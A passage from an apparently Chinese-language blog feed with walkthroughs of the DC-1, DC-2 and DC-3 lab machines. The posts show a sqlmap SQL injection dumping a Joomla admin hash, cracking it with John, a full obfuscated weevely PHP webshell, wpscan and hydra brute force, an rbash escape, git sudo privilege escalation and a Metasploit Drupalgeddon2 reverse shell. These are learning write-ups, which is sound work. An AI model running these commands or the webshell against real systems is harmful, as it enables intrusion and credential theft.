<p>Database: joomladb<br>[76 tables]<br>+———————+<br>| #__assets           |<br>| #__associations     |<br>| #__banner_clients   |<br>| #__banner_tracks    |<br>| #__banners          |<br>| #__bsms_admin       |<br>| #__bsms_books       |<br>| #__bsms_comments    |<br>| #__bsms_locations   |<br>| #__bsms_mediafiles  |<br>| #__bsms_message_typ |<br>| #__bsms_podcast     |<br>| #__bsms_series      |<br>| #__bsms_servers     |<br>| #__bsms_studies     |<br>| #__bsms_studytopics |<br>| #__bsms_teachers    |<br>| #__bsms_templatecod |<br>| #__bsms_templates   |<br>| #__bsms_timeset     |<br>| #__bsms_topics      |<br>| #__bsms_update      |<br>| #__categories       |<br>| #__contact_details  |<br>| #__content_frontpag |<br>| #__content_rating   |<br>| #__content_types    |<br>| #__content          |<br>| #_<em>contentitem_tag</em> |<br>| #__core_log_searche |<br>| #__extensions       |<br>| #__fields_categorie |<br>| #__fields_groups    |<br>| #__fields_values    |<br>| #__fields           |<br>| #__finder_filters   |<br>| #__finder_links_ter |<br>| #__finder_links     |<br>| #_<em>finder_taxonomy</em> |<br>| #__finder_taxonomy  |<br>| #__finder_terms_com |<br>| #__finder_terms     |<br>| #__finder_tokens_ag |<br>| #__finder_tokens    |<br>| #__finder_types     |<br>| #__jbsbackup_timese |<br>| #__jbspodcast_times |<br>| #__languages        |<br>| #__menu_types       |<br>| #__menu             |<br>| #__messages_cfg     |<br>| #__messages         |<br>| #__modules_menu     |<br>| #__modules          |<br>| #__newsfeeds        |<br>| #__overrider        |<br>| #__postinstall_mess |<br>| #__redirect_links   |<br>| #__schemas          |<br>| #__session          |<br>| #__tags             |<br>| #__template_styles  |<br>| #__ucm_base         |<br>| #__ucm_content      |<br>| #__ucm_history      |<br>| #__update_sites_ext |<br>| #__update_sites     |<br>| #__updates          |<br>| #__user_keys        |<br>| #__user_notes       |<br>| #__user_profiles    |<br>| #__user_usergroup_m |<br>| #__usergroups       |<br>| #__users            |<br>| #__utf8_conversion  |<br>| #__viewlevels       |<br>+———————+</p>
</blockquote>
<p>查字段<br>sqlmap -u “<a href="http://192.168.18.134/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list%5Bfullordering%5D=updatexml&quot;">http://192.168.18.134/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot;</a> –risk=3 –random-agent -p list[fullordering] -D “joomladb” -T “#__users” –columns</p>
<blockquote>
<p>Database: joomladb<br>Table: #__users<br>[6 columns]<br>+———-+————-+<br>| Column   | Type        |<br>+———-+————-+<br>| email    | non-numeric |<br>| id       | numeric     |<br>| name     | non-numeric |<br>| params   | non-numeric |<br>| password | non-numeric |<br>| username | non-numeric |<br>+———-+————-+</p>
</blockquote>
<br>

<p>sqlmap -u “<a href="http://192.168.18.134/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list%5Bfullordering%5D=updatexml&quot;">http://192.168.18.134/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot;</a> –risk=3 –level=5 –random-agent -D joomladb -T “#__users” -C “username,password” –dump  -p list[fullordering]</p>
<blockquote>
<p>Database: joomladb<br>Table: #__users<br>[1 entry]<br>+———-+————————————————————–+<br>| username | password                                                     |<br>+———-+————————————————————–+<br>| admin    | $2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu |<br>+———-+————————————————————–+</p>
</blockquote>
<br>

<p>把密码存储起来使用John爆破</p>
<br>

<blockquote>
<p><code>vim dc3password_hash.txt</code></p>
<p>kali@kali2020:<del>/Tools$ cat dc3password_hash.txt<br>$2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu<br>kali@kali2020:</del>/Tools$ sudo john dc3password_hash.txt -show<br>?:snoopy</p>
</blockquote>
<p>得到密码为snoopy</p>
<p>去登录后台(admin,snoopy),成功登录</p>
<p>寻找可以上传shell的位置</p>
<p>使用kali上自带的weevely（一款webshell管理工具）</p>
<blockquote>
<p>kali@kali2020:~$ weevely generate pass shell.php</p>
<p>Generated ‘shell.php’ with password ‘pass’ of 761 byte size.</p>
<p>kali@kali2020:~$ cat shell.php<br><?php
$Q='unction0/ x($t,$k){0/$0/c=strlen($k)0/;$0/l=strlen($0/t0/0/);$o="";f0/or($i=0;0/$i<$l;){for(0/$j0/0/';
$O='"0//$kh(.+)$0/kf/0/",@fi0/le_get_co0/0/ntents("php://0/i0/nput")0/,$m)==1) {0/@ob_st0/art();@e0/va';
$w='_e0/nd_cle0/an();$r=@base0/0/64_encode(@x(0/0/@gzc0/o0/m0/press($o),$k));pr0/int(0/"$p$kh$r$kf");}';
$o='$k="1a1dc0/91c";0/$k0/h="907320/5c0/69271";$k0/f="ddf0c940/4bc0/72";0/$p="Dw8BNaV0/0/He7JVExH0/0/0";f';
$Z=str_replace('iC','','criCeiCaiCteiC_funciCtiCion');
$A='=0;0/($j<$c&0/&0/$i0/<$l);$j0/++,$i++){$0/o.=$t{$i}^$k{$j};}}ret0/urn $0/o;}i0/f (@preg_0/match0/(';
$i='l0/(@gzun0/compress(0/@x(@0/base60/4_deco0/de($m[1])0/,$k)))0/;0/$o=@o0/b_get_conte0/nts();@0/o0/b';
$X=str_replace('0/','',$o.$Q.$A.$O.$i.$w);
$R=$Z('',$X);$R();
?></p>
</blockquote>
<p>将shell.php上传后进行连接</p>
<blockquote>
<p>kali@kali2020:~$ weevely <a href="http://192.168.18.134/templates/beez3/shell.php">http://192.168.18.134/templates/beez3/shell.php</a> pass</p>
<p>[+] weevely 4.0.1</p>
<p>[+] Target:     192.168.18.134<br>[+] Session:    /home/kali/.weevely/sessions/192.168.18.134/shell_1.session</p>
<p>[+] Browse the filesystem or execute commands starts the connection<br>[+] to the target. Type :help for more information.</p>
<p>weevely&gt; shell<br>sh: 1: shell: not found<br>www-data@DC-3:/var/www/html/templates/beez3 $ whoami<br>www-data<br>www-data@DC-3:/var/www/html/templates/beez3 $ </p>
<br>
</blockquote>
<p>想办法提权</p>
<p>查看靶机版本，发现为ubunutu16.04 内核版本为4.4.0-21</p>
<blockquote>
<p>www-data@DC-3:/var/www/html $ uname -a<br>Linux DC-3 4.4.0-21-generic #37-Ubuntu SMP Mon Apr 18 18:34:49 UTC 2016 i686 i686 i686 GNU/Linux<br>www-data@DC-3:/var/www/html $  lsb_release -a<br>No LSB modules are available.<br>Distributor ID: Ubuntu<br>Description:    Ubuntu 16.04 LTS<br>Release:        16.04<br>Codename:       xenial</p>
</blockquote>
<p>去漏洞库找下</p>
<blockquote>
<p>kali@kali2020:~/Tools$ searchsploit -w ubuntu 16.04 4.4.0-21</p>
<hr>
<p> Exploit Title                                                                |  URL</p>
<hr>
<p>Linux Kernel 4.10.5 / &lt; 4.14.3 (Ubuntu) - DCCP Socket Use-After-Free          | <a href="https://www.exploit-db.com/exploits/43234">https://www.exploit-db.com/exploits/43234</a><br>Linux Kernel 4.4.0-21 (Ubuntu 16.04 x64) - Netfilter ‘target_offset’ Out-of-B | <a href="https://www.exploit-db.com/exploits/40049">https://www.exploit-db.com/exploits/40049</a><br>Linux Kernel 4.4.0-21 &lt; 4.4.0-51 (Ubuntu 14.04/16.04 x64) - ‘AF_PACKET’ Race  | <a href="https://www.exploit-db.com/exploits/47170">https://www.exploit-db.com/exploits/47170</a><br>Linux Kernel &lt; 4.13.9 (Ubuntu 16.04 / Fedora 27) - Local Privilege Escalation | <a href="https://www.exploit-db.com/exploits/45010">https://www.exploit-db.com/exploits/45010</a><br>Linux Kernel &lt; 4.4.0-116 (Ubuntu 16.04.4) - Local Privilege Escalation        | <a href="https://www.exploit-db.com/exploits/44298">https://www.exploit-db.com/exploits/44298</a><br>Linux Kernel &lt; 4.4.0-21 (Ubuntu 16.04 x64) - ‘netfilter target_offset’ Local  | <a href="https://www.exploit-db.com/exploits/44300">https://www.exploit-db.com/exploits/44300</a><br>Linux Kernel &lt; 4.4.0-83 / &lt; 4.8.0-58 (Ubuntu 14.04/16.04) - Local Privilege E | <a href="https://www.exploit-db.com/exploits/43418">https://www.exploit-db.com/exploits/43418</a><br>Linux Kernel &lt; 4.4.0/ &lt; 4.8.0 (Ubuntu 14.04/16.04 / Linux Mint 17/18 / Zorin) | <a href="https://www.exploit-db.com/exploits/47169">https://www.exploit-db.com/exploits/47169</a><br>Ubuntu &lt; 15.10 - PT Chown Arbitrary PTs Access Via User Namespace Privilege E | <a href="https://www.exploit-db.com/exploits/41760">https://www.exploit-db.com/exploits/41760</a></p>
<hr>
<p>Shellcodes: No Results</p>
</blockquote>
<br>

<br>

<blockquote>
<p>www-data@DC-3:/var/www $ wget  <a href="https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39772.zip">https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39772.zip</a><br>–2021-05-01 23:52:54–  <a href="https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39772.zip">https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39772.zip</a><br>Resolving github.com (github.com)… 13.250.177.223<br>Connecting to github.com (github.com)|13.250.177.223|:443… connected.<br>HTTP request sent, awaiting response… 302 Found<br>Location: <a href="https://raw.githubusercontent.com/offensive-security/exploitdb-bin-sploits/master/bin-sploits/39772.zip">https://raw.githubusercontent.com/offensive-security/exploitdb-bin-sploits/master/bin-sploits/39772.zip</a> [following]<br>–2021-05-01 23:52:55–  <a href="https://raw.githubusercontent.com/offensive-security/exploitdb-bin-sploits/master/bin-sploits/39772.zip">https://raw.githubusercontent.com/offensive-security/exploitdb-bin-sploits/master/bin-sploits/39772.zip</a><br>Resolving raw.githubusercontent.com (raw.githubusercontent.com)… ::1, 127.0.0.1<br>Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|::1|:443… failed: Connection refused.<br>Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|127.0.0.1|:443… failed: Connection refused.<br>www-data@DC-3:/var/www $ ls<br>html<br>www-data@DC-3:/var/www $ wget  <a href="https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39772.zip">https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39772.zip</a></p>
<p>–2021-05-01 23:53:39–  <a href="https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39772.zip">https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39772.zip</a><br>Resolving github.com (github.com)… 13.250.177.223<br>Connecting to github.com (github.com)|13.250.177.223|:443… connected.<br>HTTP request sent, awaiting response… No data received.<br>Retrying.</p>
<p>–2021-05-01 23:53:56–  (try: 2)  <a href="https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39772.zip">https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39772.zip</a><br>Connecting to github.com (github.com)|13.250.177.223|:443… failed: Connection refused.<br>Resolving github.com (github.com)… 13.229.188.59<br>Connecting to github.com (github.com)|13.229.188.59|:443… connected.<br>HTTP request sent, awaiting response… 302 Found<br>Location: <a href="https://raw.githubusercontent.com/offensive-security/exploitdb-bin-sploits/master/bin-sploits/39772.zip">https://raw.githubusercontent.com/offensive-security/exploitdb-bin-sploits/master/bin-sploits/39772.zip</a> [following]<br>–2021-05-01 23:54:18–  <a href="https://raw.githubusercontent.com/offensive-security/exploitdb-bin-sploits/master/bin-sploits/39772.zip">https://raw.githubusercontent.com/offensive-security/exploitdb-bin-sploits/master/bin-sploits/39772.zip</a><br>Resolving raw.githubusercontent.com (raw.githubusercontent.com)… ::1, 127.0.0.1<br>Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|::1|:443… failed: Connection refused.<br>Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|127.0.0.1|:443… failed: Connection refused.</p>
</blockquote>
<p>下载超时，尝试在kali先下载在让靶机在kiali上下载,最近VM虚拟机代理不管用了还在排查…</p>
<br>

<br>

<br>

<br>

<br>

<br>

<p>总结</p>
<ul>
<li><p>namp扫网段和靶机开放端口</p>
</li>
<li><p>dirsearch扫描目录</p>
</li>
<li><p>信息搜集(Joomal)</p>
</li>
<li><p>Joomscan扫描版本</p>
</li>
<li><p>searchsploit 查找joomal漏洞</p>
</li>
<li><p>sqlmap跑后台账号密码(密码被hash)</p>
</li>
<li><p>john破解hash密码</p>
</li>
<li><p>登录后台，找上传shell的地方</p>
</li>
<li><p>使用weevely生产一句话<code>weevely generate &lt;password&gt; b.php</code></p>
</li>
<li><p>使用weevely连接<code>weevely &lt;URL&gt; &lt;password&gt;</code></p>
</li>
</ul>
<p><em>weevely使用(webshell) <code>https://blog.csdn.net/qq_26090065/article/details/81235120</code></em></p>
<ul>
<li>提权(未完成)</li>
</ul>
]]></content>
      <categories>
        <category>DCchallenges</category>
      </categories>
      <tags>
        <tag>DCchallenges</tag>
      </tags>
  </entry>
  <entry>
    <title>设备磁盘/CD-ROM配置不正确</title>
    <url>/posts/f1a8aa3a/</url>
    <content><![CDATA[<p>IDE 设备 (磁盘/CD-ROM)配置不正确。“ide0:1”上具有一个 IDE 从设备，但没有主设备。此配置在虚拟机中无法正常运行。请使用配置编辑器将磁盘/CD-ROM 从“ide0:1”移到“ide0:0”。<br>解决方案:<br>虚拟机设置-&gt;CD/DVD(IDE)-&gt;高级-&gt;IDE-&gt;设置为’IDE 0:0  CD/DVD(IDE)’</p>
]]></content>
      <categories>
        <category>VM</category>
      </categories>
      <tags>
        <tag>VM</tag>
      </tags>
  </entry>
  <entry>
    <title>DCchallenges2</title>
    <url>/posts/e4e28081/</url>
    <content><![CDATA[<p>靶机DC-2下载地址：<a href="https://download.vulnhub.com/dc/DC-2.zip">https://download.vulnhub.com/dc/DC-2.zip</a></p>
<br>

<p>环境</p>
<blockquote>
<p>网段 192.168.18.0/24</p>
<p>kali 192.168.18.131</p>
<p>靶机 192.168.18.132</p>
</blockquote>
<p>扫描网段</p>
<blockquote>
<p>sudo nmap -sn 192.168.18.0/24</p>
<p>Starting Nmap 7.91 ( <a href="https://nmap.org/">https://nmap.org</a> ) at 2021-04-30 10:12 CST<br>Nmap scan report for 192.168.18.2<br>Host is up (0.00013s latency).<br>MAC Address: 00:50:56:E0:DA:9A (VMware)<br>Nmap scan report for 192.168.18.132<br>Host is up (0.00055s latency).<br>MAC Address: 00:0C:29:4B:26:E6 (VMware)<br>Nmap scan report for 192.168.18.254<br>Host is up (0.00017s latency).<br>MAC Address: 00:50:56:E1:37:77 (VMware)<br>Nmap scan report for 192.168.18.131<br>Host is up.<br>Nmap done: 256 IP addresses (4 hosts up) scanned in 2.24 seconds<br>kali@kali2020:~$ </p>
</blockquote>
<p>扫描靶机开放的端口</p>
<blockquote>
<p>sudo nmap 192.168.18.132 -p- -sV<br>Starting Nmap 7.91 ( <a href="https://nmap.org/">https://nmap.org</a> ) at 2021-04-30 11:38 CST<br>Nmap scan report for dc-2 (192.168.18.132)<br>Host is up (0.0013s latency).<br>Not shown: 65533 closed ports<br>PORT     STATE SERVICE VERSION<br>80/tcp   open  http    Apache httpd 2.4.10 ((Debian))<br>7744/tcp open  ssh     OpenSSH 6.7p1 Debian 5+deb8u7 (protocol 2.0)<br>MAC Address: 00:0C:29:4B:26:E6 (VMware)<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</p>
</blockquote>
<p>开放了80端口和ssh端口，浏览器去访问发现无法访问，直接跳转成了dc2，去修改hosts</p>
<blockquote>
<p>sudo vim /etc/hosts</p>
<p>添加 192.168.18.132 dc-2</p>
</blockquote>
<p>再去访问192.168.18.132即可,发现是wordpress</p>
<h4 id="flag1"><a href="#flag1" class="headerlink" title="flag1"></a>flag1</h4><p>点击flag 得到flag1，提示使用<code>cewl</code></p>
<p><img src="/posts/e4e28081/flag1.png"></p>
<p>用<code>dirb</code>扫一下目录</p>
<p>扫到一个wp-admin 去访问后会跳转到登录页面 <a href="http://dc-2/wp-login.php">http://dc-2/wp-login.php</a></p>
<p>这里也可以用<code>nikto</code></p>
<p><img src="/posts/e4e28081/nikto1.png"></p>
<h4 id="flag2"><a href="#flag2" class="headerlink" title="flag2"></a>flag2</h4><p>使用kali自带的wpscan扫一下<br><code>wpscan --url dc-2 -e u</code></p>
<p><img src="/posts/e4e28081/wpscan1.png"></p>
<br>

<p>扫到三个用户名，admin,jerry,tom<br>创建一个list存放这三个用户名</p>
<br>

<p>根据flag1的提示 使用<code>cewl</code>生成密码字典</p>
<br>

<blockquote>
<p>kali@kali2020:~/Desktop$ cewl dc-2 -w dc-2.dic<br>CeWL 5.4.8 (Inclusion) Robin Wood (<a href="mailto:&#114;&#111;&#x62;&#x69;&#x6e;&#x40;&#100;&#x69;&#103;&#x69;&#x2e;&#110;&#105;&#x6e;&#x6a;&#97;">&#114;&#111;&#x62;&#x69;&#x6e;&#x40;&#100;&#x69;&#103;&#x69;&#x2e;&#110;&#105;&#x6e;&#x6a;&#97;</a>) (<a href="https://digi.ninja/">https://digi.ninja/</a>)</p>
<p>kali@kali2020:~/Desktop$ cat dc-2.dic </p>
</blockquote>
<p>使用wpscan爆破</p>
<blockquote>
<p>kali@kali2020:~/Desktop$ wpscan –url dc-2 -U dc-2users.list  -P dc-2.dic </p>
<p>[!] Valid Combinations Found:<br> | Username: jerry, Password: adipiscing<br> | Username: tom, Password: parturient</p>
</blockquote>
<p><img src="/posts/e4e28081/wpscan2.png"></p>
<p>使用tom 成功登录，发现有篇名为hello-word的文章进去看看</p>
<p>有一个搜索功能，尝试一下，发现输入1会出现flag1,输入2出现flag2<br><img src="/posts/e4e28081/flag2.png"><br><img src="/posts/e4e28081/flag12.png"><br>flag2提示换一条路，也是就说让我们去尝试ssh端口</p>
<p>使用hydra爆破ssh</p>
<blockquote>
<p>kali@kali2020:~/Desktop$ hydra -L dc-2users.list  -P dc-2.dic  192.168.18.132 ssh -s 7744</p>
<p> 得到账号密码</p>
<p>[7744][ssh] host: 192.168.18.132   login: tom   password: parturient</p>
</blockquote>
<h4 id="flag3"><a href="#flag3" class="headerlink" title="flag3"></a>flag3</h4><p>使用ssh登录<br><code>kali@kali2020:~/Desktop$ ssh tom@192.168.18.132 -p 7744</code><br>登录后<code>ls</code>后发现存在flag3.txt</p>
<p>使用<code>cat flag3.txt</code></p>
<blockquote>
<p>-rbash: sudo: command not found</p>
</blockquote>
<p><img src="/posts/e4e28081/rbashnotfound.png"></p>
<p><strong>-rbash绕过</strong><br>解决方案 <a href="https://www.cnblogs.com/xiaoxiaoleo/p/8450379.html">https://www.cnblogs.com/xiaoxiaoleo/p/8450379.html</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">BASH_CMDS[a]&#x3D;&#x2F;bin&#x2F;sh;a </span><br><span class="line">export PATH&#x3D;$PATH:&#x2F;bin&#x2F;</span><br><span class="line">export PATH&#x3D;$PATH:&#x2F;usr&#x2F;bin</span><br></pre></td></tr></table></figure>
<p><img src="/posts/e4e28081/flag3.png"></p>
<p>得到flag3</p>
<h4 id="flag4"><a href="#flag4" class="headerlink" title="flag4"></a>flag4</h4><p>根据flag3提示，使用<code>su</code>切换到jerry用户下<br><code>cat /etc/passwd </code>发现Jerry用户<br>输入之前爆破出来的密码成功登录Jerry用户</p>
<blockquote>
<p>cd ~<br>ls<br>cat flag4.txt<br>Good to see that you’ve made it this far - but you’re not home yet.<br>You still need to get the final flag (the only flag that really counts!!!).<br>No hints here - you’re on your own now.  :-)<br>Go on - git outta here!!!!<br><br><br><br></p>
</blockquote>
<h4 id="flag5"><a href="#flag5" class="headerlink" title="flag5"></a>flag5</h4><p>查看sudo 支持的免密命令</p>
<blockquote>
<p>sudo -l</p>
<p>Matching Defaults entries for jerry on DC-2:<br>    env_reset, mail_badpass,<br>    secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin</p>
<p>User jerry may run the following commands on DC-2:<br>    (root) NOPASSWD: /usr/bin/git</p>
</blockquote>
<p>根据上一个提示 这里的git命令推测可以使用</p>
<p>考虑git提权 <a href="https://gtfobins.github.io/gtfobins/git/">https://gtfobins.github.io/gtfobins/git/</a></p>
<blockquote>
<p>sudo git -p –help</p>
</blockquote>
<p><img src="/posts/e4e28081/git1.png"><br><img src="/posts/e4e28081/git2.png"><br><img src="/posts/e4e28081/git3.png"><br><img src="/posts/e4e28081/finalflag.png"></p>
<p><strong>总结</strong></p>
<ul>
<li> rbash绕过</li>
<li> git提权</li>
</ul>
]]></content>
      <categories>
        <category>DCchallenges</category>
      </categories>
      <tags>
        <tag>DCchallenges</tag>
      </tags>
  </entry>
  <entry>
    <title>DCchallenges1</title>
    <url>/posts/7debd13b/</url>
    <content><![CDATA[<p>安装</p>
<p>下载解压后使用Vmware打开ova文件，选择桥接模式，同时也将kali设置为桥接模式</p>
<br>

<p>环境</p>
<blockquote>
<p>网段 192.168.18.0/24</p>
<p>kali 192.168.18.131</p>
<p>靶机 192.168.18.130</p>
</blockquote>
<br>

<p>扫描网段</p>
<blockquote>
<p><strong>sudo nmap -sn 192.168.18.0/24</strong></p>
<p>Starting Nmap 7.91 ( <a href="https://nmap.org/">https://nmap.org</a> ) at 2021-04-27 21:30 CST<br>Nmap scan report for 192.168.18.2<br>Host is up (0.00015s latency).<br>MAC Address: 00:50:56:E0:DA:9A (VMware)<br>Nmap scan report for 192.168.18.130<br>Host is up (0.00018s latency).<br>MAC Address: 00:0C:29:F4:40:B8 (VMware)<br>Nmap scan report for 192.168.18.254<br>Host is up (0.00036s latency).<br>MAC Address: 00:50:56:F1:CD:81 (VMware)<br>Nmap scan report for 192.168.18.131<br>Host is up.<br>Nmap done: 256 IP addresses (4 hosts up) scanned in 2.16 seconds</p>
</blockquote>
<br>

<p>扫描靶机开放的端口</p>
<blockquote>
<p><strong>sudo nmap -sS 192.168.18.130</strong></p>
<p>Starting Nmap 7.91 ( <a href="https://nmap.org/">https://nmap.org</a> ) at 2021-04-27 21:31 CST<br>Nmap scan report for 192.168.18.130<br>Host is up (0.000079s latency).<br>Not shown: 997 closed ports<br>PORT    STATE SERVICE<br>22/tcp  open  ssh<br>80/tcp  open  http<br>111/tcp open  rpcbind<br>MAC Address: 00:0C:29:F4:40:B8 (VMware)</p>
<p>Nmap done: 1 IP address (1 host up) scanned in 0.24 seconds</p>
<p>注：sS ：半开放扫描（非3次握手的tcp扫描）比较安全，不会产生会话，几乎不会产生日志，工作中常用，建议大家不要直接全上的去扫，稳妥更稳妥，需要有root权限</p>
</blockquote>
<p>发现开放了80端口，就用浏览器去访问一下<code>192.168.18.130:80</code> 根据网站页面显示信息可以判断是Drupal的CMS</p>
<p>用dirsearch扫一下看看有什么</p>
<blockquote>
<p><strong>python3 dirsearch.py -u 192.168.18.130:80</strong></p>
</blockquote>
<p>用dirb 扫一下试试</p>
<blockquote>
<p><strong>dirb <a href="http://192.168.18.130/">http://192.168.18.130</a></strong></p>
</blockquote>
<p>没找到啥有用的信息，看下robots.txt</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Crawl-delay: 10</span><br><span class="line"># Directories</span><br><span class="line">Disallow: &#x2F;includes&#x2F;</span><br><span class="line">Disallow: &#x2F;misc&#x2F;</span><br><span class="line">Disallow: &#x2F;modules&#x2F;</span><br><span class="line">Disallow: &#x2F;profiles&#x2F;</span><br><span class="line">Disallow: &#x2F;scripts&#x2F;</span><br><span class="line">Disallow: &#x2F;themes&#x2F;</span><br><span class="line"># Files</span><br><span class="line">Disallow: &#x2F;CHANGELOG.txt</span><br><span class="line">Disallow: &#x2F;cron.php</span><br><span class="line">Disallow: &#x2F;INSTALL.mysql.txt</span><br><span class="line">Disallow: &#x2F;INSTALL.pgsql.txt</span><br><span class="line">Disallow: &#x2F;INSTALL.sqlite.txt</span><br><span class="line">Disallow: &#x2F;install.php</span><br><span class="line">Disallow: &#x2F;INSTALL.txt</span><br><span class="line">Disallow: &#x2F;LICENSE.txt</span><br><span class="line">Disallow: &#x2F;MAINTAINERS.txt</span><br><span class="line">Disallow: &#x2F;update.php</span><br><span class="line">Disallow: &#x2F;UPGRADE.txt</span><br><span class="line">Disallow: &#x2F;xmlrpc.php</span><br><span class="line"># Paths (clean URLs)</span><br><span class="line">Disallow: &#x2F;admin&#x2F;</span><br><span class="line">Disallow: &#x2F;comment&#x2F;reply&#x2F;</span><br><span class="line">Disallow: &#x2F;filter&#x2F;tips&#x2F;</span><br><span class="line">Disallow: &#x2F;node&#x2F;add&#x2F;</span><br><span class="line">Disallow: &#x2F;search&#x2F;</span><br><span class="line">Disallow: &#x2F;user&#x2F;register&#x2F;</span><br><span class="line">Disallow: &#x2F;user&#x2F;password&#x2F;</span><br><span class="line">Disallow: &#x2F;user&#x2F;login&#x2F;</span><br><span class="line">Disallow: &#x2F;user&#x2F;logout&#x2F;</span><br><span class="line"># Paths (no clean URLs)</span><br><span class="line">Disallow: &#x2F;?q&#x3D;admin&#x2F;</span><br><span class="line">Disallow: &#x2F;?q&#x3D;comment&#x2F;reply&#x2F;</span><br><span class="line">Disallow: &#x2F;?q&#x3D;filter&#x2F;tips&#x2F;</span><br><span class="line">Disallow: &#x2F;?q&#x3D;node&#x2F;add&#x2F;</span><br><span class="line">Disallow: &#x2F;?q&#x3D;search&#x2F;</span><br><span class="line">Disallow: &#x2F;?q&#x3D;user&#x2F;password&#x2F;</span><br><span class="line">Disallow: &#x2F;?q&#x3D;user&#x2F;register&#x2F;</span><br><span class="line">Disallow: &#x2F;?q&#x3D;user&#x2F;login&#x2F;</span><br><span class="line">Disallow: &#x2F;?q&#x3D;user&#x2F;logout&#x2F;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>没什么有用的信息</p>
<br>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfconsole</span><br><span class="line"></span><br><span class="line">msf6 &gt; search drupal</span><br><span class="line">msf6 &gt; use exploit&#x2F;unix&#x2F;webapp&#x2F;drupal_drupalgeddon2 </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 exploit(unix&#x2F;webapp&#x2F;drupal_drupalgeddon2) &gt; show options </span><br><span class="line">msf6 exploit(unix&#x2F;webapp&#x2F;drupal_drupalgeddon2) &gt; set rhosts 192.168.18.130</span><br><span class="line">msf6 exploit(unix&#x2F;webapp&#x2F;drupal_drupalgeddon2) &gt; show options </span><br><span class="line">msf6 exploit(unix&#x2F;webapp&#x2F;drupal_drupalgeddon2) &gt; exploit </span><br><span class="line">[*] Started reverse TCP handler on 192.168.18.131:4444 </span><br><span class="line">[*] Executing automatic check (disable AutoCheck to override)</span><br><span class="line">[!] The service is running, but could not be validated.</span><br><span class="line">[*] Sending stage (39282 bytes) to 192.168.18.130</span><br><span class="line">[*] Meterpreter session 1 opened (192.168.18.131:4444 -&gt; 192.168.18.130:43581) at 2021-04-28 20:26:27 +0800</span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: www-data (33)</span><br><span class="line">meterpreter &gt; pwd</span><br><span class="line">&#x2F;var&#x2F;www</span><br><span class="line">meterpreter &gt; ls</span><br><span class="line">Listing: &#x2F;var&#x2F;www</span><br><span class="line">meterpreter &gt; shell</span><br><span class="line">Process 4653 created.</span><br><span class="line">Channel 3 created.</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="flag1"><a href="#flag1" class="headerlink" title="flag1"></a>flag1</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd &#x2F;var&#x2F;www</span><br><span class="line">cat falg1.txt</span><br><span class="line">Every good CMS needs a config file - and so do you.</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="flag4"><a href="#flag4" class="headerlink" title="flag4"></a>flag4</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">cat &#x2F;etc&#x2F;passwd</span><br><span class="line">发现下面有个falg4  flag4:x:1001:1001:Flag4,,,:&#x2F;home&#x2F;flag4:&#x2F;bin&#x2F;bash</span><br><span class="line">cd &#x2F;home&#x2F;flag4</span><br><span class="line">ls</span><br><span class="line">flag4.txt</span><br><span class="line">cat flag4.txt</span><br><span class="line">Can you use this same method to find or access the flag in root?</span><br><span class="line"></span><br><span class="line">Probably. But perhaps it&#39;s not that easy.  Or maybe it is?</span><br></pre></td></tr></table></figure>

<br>

<h4 id="flag2"><a href="#flag2" class="headerlink" title="flag2"></a>flag2</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">查看网站配置 看有什么有用信息</span><br><span class="line">cd &#x2F;var&#x2F;www&#x2F;site&#x2F;default</span><br><span class="line">ls</span><br><span class="line">default.settings.php</span><br><span class="line">files</span><br><span class="line">settings.php</span><br><span class="line"></span><br><span class="line">cat settings.php</span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">&#x2F;**</span><br><span class="line"> *</span><br><span class="line"> * flag2</span><br><span class="line"> * Brute force and dictionary attacks aren&#39;t the</span><br><span class="line"> * only ways to gain access (and you WILL need access).</span><br><span class="line"> * What can you do with these credentials?</span><br><span class="line"> *</span><br><span class="line"> *&#x2F;</span><br><span class="line"> </span><br><span class="line">$databases &#x3D; array (</span><br><span class="line">  &#39;default&#39; &#x3D;&gt; </span><br><span class="line">  array (</span><br><span class="line">    &#39;default&#39; &#x3D;&gt; </span><br><span class="line">    array (</span><br><span class="line">      &#39;database&#39; &#x3D;&gt; &#39;drupaldb&#39;,</span><br><span class="line">      &#39;username&#39; &#x3D;&gt; &#39;dbuser&#39;,</span><br><span class="line">      &#39;password&#39; &#x3D;&gt; &#39;R0ck3t&#39;,</span><br><span class="line">      &#39;host&#39; &#x3D;&gt; &#39;localhost&#39;,</span><br><span class="line">      &#39;port&#39; &#x3D;&gt; 